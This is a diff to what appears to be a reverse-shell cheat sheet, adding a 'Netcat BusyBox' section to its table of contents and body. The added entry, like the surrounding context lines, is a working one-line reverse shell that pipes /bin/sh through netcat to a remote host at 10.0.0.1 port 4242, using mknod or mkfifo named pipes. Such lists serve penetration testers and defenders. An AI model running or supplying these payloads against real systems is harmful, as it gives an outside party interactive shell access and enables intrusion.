@@ -17,6 +17,7 @@
     * [Lua](#lua)
     * [Ncat](#ncat)
     * [Netcat OpenBsd](#netcat-openbsd)
+    * [Netcat BusyBox](#netcat-busybox)
     * [Netcat Traditional](#netcat-traditional)
     * [NodeJS](#nodejs)
     * [OpenSSL](#openssl)
@@ -155,6 +156,12 @@ nc -c bash 10.0.0.1 4242
 
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+```
+
+### Netcat BusyBox
+
+```bash
+rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
 ```
 
 ### Ncat
